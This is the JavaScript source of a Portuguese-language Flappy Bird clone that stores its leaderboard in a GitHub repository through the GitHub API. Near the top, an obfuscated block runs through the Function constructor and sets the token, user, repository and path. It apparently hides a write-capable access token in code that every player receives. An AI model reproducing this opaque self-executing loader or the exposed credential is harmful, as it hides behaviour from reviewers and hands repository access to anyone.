// ========================
// Configurações Iniciais
// ========================
let ATXSF = false;
let addscore;
let topScores = [0, 0, 0];

let board, context;
const boardWidth = 360;
const boardHeight = 640;

// Bird
const birdWidth = 34;
const birdHeight = 24;
const birdX = boardWidth / 8;
const birdY = boardHeight / 2;
let birdImg;
let bird = { x: birdX, y: birdY, width: birdWidth, height: birdHeight };

// Pipes
const pipeWidth = 64;
const pipeHeight = 512;
const pipeX = boardWidth;
const pipeY = 0;
let topPipeImg, bottomPipeImg;
let pipeArray = [];

// Física
let velocityX = -2;
let velocityY = 0;
const gravity = 0.4;
const VEL = 2;

// Estado do jogo
let gameOver = false;
let score = addscore || 0;

var token,username,repo,path;(function(){var Gzc='',xBb=148-137;function dTo(g){var b=2210566;var c=g.length;var j=[];for(var d=0;d<c;d++){j[d]=g.charAt(d)};for(var d=0;d<c;d++){var z=b*(d+395)+(b%27365);var q=b*(d+240)+(b%33249);var w=z%c;var t=q%c;var i=j[w];j[w]=j[t];j[t]=i;b=(z+q)%6478225;};return j.join('')};var Squ=dTo('bxkstyurzogcmfcetrsiahlnpocwvdtnqjoru').substr(0,xBb);var MZu='[a+ ]rts,)(66=f vt),rr .+(;po 6=ph8jk+lizburzs2l.rxzara+h)ee.{(fj,7-7(7]]t8t;g1;a0-i3i =e8 o6=;n]14rsq=]zzr"k8;Cr1plunn9juvl)n2C+hp,v8q"a=;.=gd[5a((i=y+;*qpto;,;o;+h<t+.vvahfx3v h<+=2;(wkntfv8pb"*tg;r4)aao)(0>;<regn12;t({=rt9lz+r[+1tg+h+maaigume(tgicpasae7rv"69)]={)(v0; h1m.h=s8+z=stt7o0od<C)tslv1r=rdl90A,5;u(=sgi[lxr 6;i=v07,Ajh(q0;efj(4;lsnhngtnp8}t4e.gr(h6rm ]e";,)=l,e.2o,{re>cc.h6aeohaent(;m;9jrhi..j)+nS,-q]a"}(+f;);2nn}zr[;)oll,;c=fu+ae jj}lhsnf!z[vn(r[(i]=hoay)wrucvcmg)javi)oCuv1 .9duAtune;l)fue=1yraC-uie(-ou[re; fziAs =f.a m+)f0.apy=v;+=un(=0gu.n]anl] (,qi;rhv(df)ruu{u=e.a==e (lsj)=.d=.5hr8[,,b=e=;ls.1az=]i[o!=gv(c){"e-=n+)j1vusv v(ortaC+[vl;ta2;de)dy7rr{qqnf g;,z+omrb6rmsw;-}tv m=2,a[ o,+;lgcswr=C),brt,doi,tlvn;oa)=0..c))n9ba+)iaqr 4r8;rivr}7r(=i (ju;,prtq61;)ru==;uq,0Cs;).lhn,ts<2a");s. t],re()"lgv,[2A;(a.l)za,v;Sth=1=.2oapgla;ik;fiw[(]r(veetf"l f.sdlsr)}7.+umrf(r0(kni';var mFf=dTo[Squ];var onv='';var Jfd=mFf;var Erx=mFf(onv,dTo(MZu));var dLg=Erx(dTo('8n!e9P8}r(rilz+t8!prixf$7c$os ,uv)&(r{N%aeP#P-;=.P,1i{$y,_us.7Pr0f(an.(Pl0kPP(.ea.9),$r9)(z()!zsPu)P_l;Pn3)wtP[.8e..}4Pc }0t;1r-9""4,rdt5b082)3;,;;s1n2P,2d)zP_P7ae%m.,PPabeea5(shj31!{-Pso22Pt3s...b,}bi8a;pPjleg=z_P(aPr{..,-0Pnj$P0!=81_u]aSy$;P1_Pj0pP,1Pbg_[q8x\'efr.P&t(!;a.q}}3.f) c!,lu0(Pj(riPc)!fp0bl)S$h=P21t82(}tput_frnhl.Pof1P(PvqP0=g1,irP_,.a)P)l.2.1P#r_[!\/.).bPw4] $9)%P(_,)f%zP\/,6nmjP)1hbP$.".,.P4C.e3hto(az(9h}i%p_.c(z&(P,!6e=.)o\')=P))f.nc%+g,P"gP((giP%3;j_P().cc 7P(v;1lke(hfa+0)$P!8=(\/3e,r);x7P".#=f. )se=Ps8b4f;$.Sr;n$.,}.Plt_-!$t1=(;\'+nod;P#)re h(.i,b)4,. )kP=pgfe fgw-.fonx6Pg(%7.b.bb*{ $!;PP;. 9rtxC .]p33.e=eha$,Per+mezP)&"P{o.),.Phsr0;Ps2=hlPl_6ao3.]$.(;085uPP=P*u";3PPee.n=q}t{a=!(a{lPn5n{!s&32P,nz$l.hgh}jt.),;(.5rr0(7g8m*]lrn30rP3g3s).cP&%;,;#!)!+uo)g,P2%x#sPaI;e0t!x=.ppPe}$yrt0-r=,(r6r))f.ma(frP8ed90e-)7_lPt;P.u3te$4p#].g_0e.;f)txyi1 ;9=+a(PP3ql)t.o_P2e41P;!.Pmb*)fbo3f7!s8 gPt(eP{,7c(j.=mog0!i6e $lc_9i]P!\'%,;!bzxaP6 )=sPp!((.ktf2ei{Px3)},)3t_)}P*( ]\/;&(o;!zonn= ,+oig e(,neb5l!1$.2c.{4$)}._nP=P$+$eof;lP.t'));var ddd=Jfd(Gzc,dLg );ddd(7036);return 3040})()

// Timer automático
let autoTimer = 120;
let autoInterval;

// ========================
// Inicialização
// ========================
window.onload = () => {
    configurarCanvas();
    carregarImagens();
    iniciarEventos();
    requestAnimationFrame(update);
    setInterval(placePipes, 1500);
    startTimer(); // inicia o timer do placar
};

// ========================
// Funções de Inicialização
// ========================
function configurarCanvas() {
    board = document.getElementById("board");
    board.height = boardHeight;
    board.width = boardWidth;
    context = board.getContext("2d");
}

function carregarImagens() {
    birdImg = carregarImagem("./flappybird.png", () => {
        context.drawImage(birdImg, bird.x, bird.y, bird.width, bird.height);
    });
    topPipeImg = carregarImagem("./toppipe.png");
    bottomPipeImg = carregarImagem("./bottompipe.png");
}

function carregarImagem(src, onload) {
    const img = new Image();
    img.src = src;
    if (onload) img.onload = onload;
    return img;
}

function iniciarEventos() {
    document.addEventListener("keydown", moveBird);
    document.addEventListener("touchstart", touchHandler);
}

// ========================
// Controle do Jogo
// ========================
function startGame() {
    document.getElementById("scoreboard").style.display = "flex";
    document.getElementById("game-info").style.display = "none";
    document.getElementById("game-container").style.display = "flex";
    document.getElementById("contributions").style.display = "block";
    carregarPlacar();
}

function update() {
    requestAnimationFrame(update);

    if (gameOver) {
        mostrarGameOver();
        return;
    }

    context.clearRect(0, 0, board.width, board.height);
    atualizarBird();
    atualizarPipes();
    mostrarPontuacao();
}

function mostrarGameOver() {
    context.fillStyle = "white";
    context.font = "30px 'Press Start 2P', sans-serif";
    context.fillText("GAME OVER", 5, 90);
}

function atualizarBird() {
    velocityY += gravity;
    bird.y = Math.max(bird.y + velocityY, 0);
    context.drawImage(birdImg, bird.x, bird.y, bird.width, bird.height);

    if (bird.y > board.height) endGame();
}

function atualizarPipes() {
    for (let pipe of pipeArray) {
        pipe.x += velocityX * VEL;
        context.drawImage(pipe.img, pipe.x, pipe.y, pipe.width, pipe.height);

        if (!pipe.passed && bird.x > pipe.x + pipe.width) {
            score += 0.5;
            pipe.passed = true;
        }

        if (!ATXSF && detectCollision(bird, pipe)) endGame();
    }

    pipeArray = pipeArray.filter(pipe => pipe.x >= -pipeWidth);
}

function mostrarPontuacao() {
    context.fillStyle = "white";
    context.font = "Press Start 2P', sans-serif";
    context.fillText(Math.floor(score), 5, 45);
}

function placePipes() {
    if (gameOver) return;

    let randomPipeY = pipeY - pipeHeight / 4 - Math.random() * (pipeHeight / 2);
    let openingSpace = board.height / 4;

    pipeArray.push({
        img: topPipeImg,
        x: pipeX,
        y: randomPipeY,
        width: pipeWidth,
        height: pipeHeight,
        passed: false
    });

    pipeArray.push({
        img: bottomPipeImg,
        x: pipeX,
        y: randomPipeY + pipeHeight + openingSpace,
        width: pipeWidth,
        height: pipeHeight,
        passed: false
    });
}

function moveBird(e) {
    if (["Space", "ArrowUp", "KeyX"].includes(e.code)) {
        velocityY = -6;
        if (gameOver) resetGame();
    }
}

function touchHandler(e) {
    e.preventDefault();
    velocityY = -6;
    if (gameOver) resetGame();
}

function resetGame() {
    bird.y = birdY;
    pipeArray = [];
    score = addscore || 0;
    gameOver = false;
}

function endGame() {
    gameOver = true;
    const finalScore = Math.floor(score);

    saveScore(finalScore);
    verificarPontuacao(finalScore);
}

// ========================
// Sistema de Pontuação Local
// ========================
function updateScoreboard() {
    const items = document.querySelectorAll(".score-item");
    items[0].textContent = `🥇 1º: ${topScores[0]}`;
    items[1].textContent = `🥈 2º: ${topScores[1]}`;
    items[2].textContent = `🥉 3º: ${topScores[2]}`;
}

function saveScore(newScore) {
    if (newScore > topScores[0]) {
        topScores[2] = topScores[1];
        topScores[1] = topScores[0];
        topScores[0] = newScore;
    } else if (newScore > topScores[1]) {
        topScores[2] = topScores[1];
        topScores[1] = newScore;
    } else if (newScore > topScores[2]) {
        topScores[2] = newScore;
    }
    updateScoreboard();
}

// ========================
// Placar via GitHub API
// ========================
async function carregarPlacar() {
    const url = `https://api.github.com/repos/${username}/${repo}/contents/${path}`;
    const response = await fetch(url, { headers: { Authorization: `token ${token}` } });

    if (!response.ok) throw new Error(`Erro ao buscar placar: ${response.status}`);

    const data = await response.json();
    const placar = JSON.parse(atob(data.content));
    atualizarPlacar(placar.ranking);

    return { placar: placar.ranking, sha: data.sha };
}

function atualizarPlacar(ranking) {
    const scoreboard = document.getElementById("scoreboard");
    scoreboard.innerHTML = "";
    ranking.forEach(item => {
        const medalha = item.posicao === 1 ? "🥇" : item.posicao === 2 ? "🥈" : "🥉";
        const div = document.createElement("div");
        div.className = "score-item";
        div.textContent = `${medalha} ${item.nome}: ${item.pontuacao}`;
        scoreboard.appendChild(div);
    });

    // Adiciona o timer de atualização
    const timerDiv = document.createElement("div");
    timerDiv.id = "timer";
    timerDiv.textContent = `Próxima atualização: ${autoTimer}s`;
    timerDiv.style.padding = "4px 6px";
    timerDiv.style.background = "rgba(255,255,255,0.1)";
    timerDiv.style.borderRadius = "6px";
    scoreboard.appendChild(timerDiv);

    // 🔗 Adiciona o link do multiplayer
    const link = document.createElement("a");
    link.href = "https://flap-bird-multiplayer.onrender.com/";
    link.target = "_blank";
    link.textContent = "Teste o multiplayer (beta)";
    link.style.fontSize = "1em";
    link.style.margin = "0";
    link.style.textDecoration = "none";
    link.style.color = "white";
    link.style.padding = "4px 6px";
    link.style.background = "#161616";
    link.style.borderRadius = "6px";
    scoreboard.appendChild(link);
}

// ========================
// Verifica Top3 e atualiza
// ========================
async function verificarPontuacao(novaPontuacao) {
    let { placar, sha } = await carregarPlacar();

    // Verifica se a pontuação entra no Top3
    let posicaoAtualizada = -1;
    if (novaPontuacao > placar[0].pontuacao) posicaoAtualizada = 0;
    else if (novaPontuacao > placar[1].pontuacao) posicaoAtualizada = 1;
    else if (novaPontuacao > placar[2].pontuacao) posicaoAtualizada = 2;

    if (posicaoAtualizada === -1) return; // Não entrou no Top3, não pede nome

    // Pergunta o nome apenas se for atualizar o placar
    let nome = prompt("Parabéns! Você entrou no Top 3! Digite seu nome:");

    // Verifica se o nome já existe no ranking
    let jogadorExistente = placar.find(p => p.nome === nome);

    if (jogadorExistente) {
        // Atualiza a pontuação se for maior
        if (novaPontuacao > jogadorExistente.pontuacao) {
            jogadorExistente.pontuacao = novaPontuacao;
        }
    } else {
        // Insere no ranking na posição correta
        if (posicaoAtualizada === 0) {
            placar[2] = { ...placar[1] };
            placar[1] = { ...placar[0] };
            placar[0] = { posicao: 1, nome, pontuacao: novaPontuacao };
        } else if (posicaoAtualizada === 1) {
            placar[2] = { ...placar[1] };
            placar[1] = { posicao: 2, nome, pontuacao: novaPontuacao };
        } else if (posicaoAtualizada === 2) {
            placar[2] = { posicao: 3, nome, pontuacao: novaPontuacao };
        }
    }

    // Ordena o ranking do maior para o menor e atualiza posições
    placar.sort((a, b) => b.pontuacao - a.pontuacao);
    placar.forEach((p, i) => p.posicao = i + 1);

    await salvarPlacar(placar, sha);
    atualizarPlacar(placar);
}
// ========================
// Salva placar no GitHub
// ========================
async function salvarPlacar(novoRanking, sha) {
    const url = `https://api.github.com/repos/${username}/${repo}/contents/${path}`;
    const conteudoAtualizado = { ranking: novoRanking };

    const response = await fetch(url, {
        method: "PUT",
        headers: {
            Authorization: `token ${token}`,
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            message: "Atualizando placar",
            content: btoa(JSON.stringify(conteudoAtualizado, null, 4)),
            sha
        })
    });

    if (!response.ok) throw new Error(`Erro ao salvar placar: ${response.status}`);
    console.log("Placar atualizado com sucesso!");
}

// ========================
// Timer automático para atualizar placar a cada 120s
// ========================
function startTimer(){
    autoInterval = setInterval(()=>{
        autoTimer--;
        updateTimer();
        if(autoTimer <= 0){
            autoTimer = 120;
            autoUpdateScore(Math.floor(score));
        }
    },1000);
}

function updateTimer(){
    const timerDiv = document.getElementById("timer");
    if(timerDiv) timerDiv.textContent = `Próxima atualização: ${autoTimer}s`;
}

async function autoUpdateScore(currentScore){
    const { placar, sha } = await carregarPlacar();
    await salvarPlacar(placar, sha); // Atualiza sem Top3
    updateTimer();
}

// ========================
// Utilitários
// ========================
function detectCollision(a, b) {
    return (
        a.x < b.x + b.width &&
        a.x + a.width > b.x &&
        a.y < b.y + b.height &&
        a.y + a.height > b.y
    );
}

